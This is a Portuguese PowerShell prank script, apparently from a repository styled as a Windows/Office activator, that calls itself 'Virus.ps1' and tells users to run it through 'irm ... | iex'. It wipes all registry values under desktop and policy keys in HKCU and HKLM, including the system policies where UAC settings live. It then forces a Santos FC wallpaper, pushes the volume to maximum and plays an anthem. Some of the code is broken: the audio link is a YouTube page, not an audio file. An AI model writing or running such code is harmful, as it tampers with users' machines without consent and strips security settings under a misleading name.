# DESBLOQUEADOR WALLPAPER COM SANTOS
# GitHub: GrassiMths/Ativador-Win-Office

# Verifica se é Administrador
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "ERRO: Execute como Administrador!" -ForegroundColor Red
    Write-Host "Use: irm https://raw.githubusercontent.com/GrassiMths/Ativador-Win-Office/main/Virus.ps1 | iex" -ForegroundColor Cyan
    pause
    exit
}

function Remove-WallpaperLock {
    Write-Host "DESBLOQUEANDO WALLPAPER..." -ForegroundColor Cyan
    
    try {
        # Remove arquivo do wallpaper anterior
        Remove-Item "$env:TEMP\neymar_wallpaper.jpg" -Force -ErrorAction SilentlyContinue

        # Limpa registro
        $userPaths = @(
            "HKCU:\Control Panel\Desktop",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
        )
        
        foreach ($path in $userPaths) {
            if (Test-Path $path) {
                Remove-ItemProperty -Path $path -Name "*" -ErrorAction SilentlyContinue
            }
        }

        $systemPaths = @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop"
        )
        
        foreach ($path in $systemPaths) {
            if (Test-Path $path) {
                Remove-ItemProperty -Path $path -Name "*" -ErrorAction SilentlyContinue
            }
        }

        Write-Host "✅ Travas removidas!" -ForegroundColor Green
    } catch {
        Write-Host "❌ Erro ao remover travas" -ForegroundColor Red
    }
}

function Set-SantosWallpaper {
    try {
        Write-Host "🎨 Configurando wallpaper do Santos..." -ForegroundColor Cyan
        
        $wallpaperUri = 'https://wallpaperbat.com/img/919626-santos-fc-wallpaper.jpg'
        $wallpaperPath = "$env:TEMP\santos_wallpaper.jpg"
        
        # Download do wallpaper do Santos
        Invoke-WebRequest -Uri $wallpaperUri -OutFile $wallpaperPath -UseBasicParsing
        
        if (Test-Path $wallpaperPath) {
            # Define o wallpaper
            if (-not ("Wallpaper.Setter" -as [type])) {
                Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
            }
            
            [Wallpaper]::SystemParametersInfo(0x0014, 0, $wallpaperPath, 0x01 -bor 0x02)
            
            # Configura como wallpaper permanente
            $desktopPath = "HKCU:\Control Panel\Desktop"
            Set-ItemProperty -Path $desktopPath -Name "Wallpaper" -Value $wallpaperPath -Force
            Set-ItemProperty -Path $desktopPath -Name "WallpaperStyle" -Value "10" -Force
            Set-ItemProperty -Path $desktopPath -Name "TileWallpaper" -Value "0" -Force
            
            # Aplica mudanças
            rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True
            
            Write-Host "✅ Wallpaper do Santos aplicado!" -ForegroundColor Green
            return $true
        }
        return $false
    } catch {
        Write-Host "❌ Erro ao configurar wallpaper" -ForegroundColor Red
        return $false
    }
}

function Play-SantosHino {
    try {
        Write-Host "🔊 Preparando hino do Santos..." -ForegroundColor Cyan
        
        # URL do hino do Santos (você precisa hospedar um arquivo MP3/WAV)
        $hinoUri = 'https://youtu.be/oFW-IE5jqcM?si=yr0InvMFOvIxGR3u'  # SUBSTITUA POR UM LINK VÁLIDO
        $hinoPath = "$env:TEMP\santos_hino.mp3"
        
        # Download do hino
        Invoke-WebRequest -Uri $hinoUri -OutFile $hinoPath -UseBasicParsing
        
        if (Test-Path $hinoPath) {
            # Define volume máximo
            $code = @"
using System;
using System.Runtime.InteropServices;
public class Audio {
    [DllImport("user32.dll")]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    
    public static void SetMaxVolume() {
        // Simula pressionar F12 50 vezes para aumentar volume (ajuste conforme necessário)
        for (int i = 0; i < 50; i++) {
            keybd_event(0xAF, 0, 0, UIntPtr.Zero); // Volume Up
            System.Threading.Thread.Sleep(50);
        }
    }
}
"@
            Add-Type -TypeDefinition $code
            [Audio]::SetMaxVolume()
            
            # Toca o hino usando Windows Media Player
            $player = New-Object -ComObject WMPlayer.OCX
            $player.URL = $hinoPath
            $player.controls.play()
            
            Write-Host "🎵 Hino do Santos tocando no volume máximo!" -ForegroundColor Green
            
            # Mantém o script rodando enquanto o áudio toca
            Start-Sleep -Seconds 30  # Ajuste conforme a duração do hino
            
            $player.controls.stop()
            return $true
        }
        return $false
    } catch {
        Write-Host "❌ Erro ao tocar hino" -ForegroundColor Red
        return $false
    }
}

# Executa o desbloqueio
Remove-WallpaperLock

# Configura wallpaper do Santos
$wallpaperSet = Set-SantosWallpaper

# Toca hino do Santos
$hinoPlayed = Play-SantosHino

Write-Host "`n" + "="*50 -ForegroundColor Green
if ($wallpaperSet) {
    Write-Host "✅ Wallpaper do Santos configurado!" -ForegroundColor Green
}
if ($hinoPlayed) {
    Write-Host "✅ Hino do Santos executado!" -ForegroundColor Green
}

Write-Host "`n🎉 DESBLOQUEIO COMPLETO!" -ForegroundColor Cyan
Write-Host "⚽ Agora você é Santista! Peixe!" -ForegroundColor Yellow

Write-Host "`nPressione qualquer tecla para sair..." -ForegroundColor Gray
pause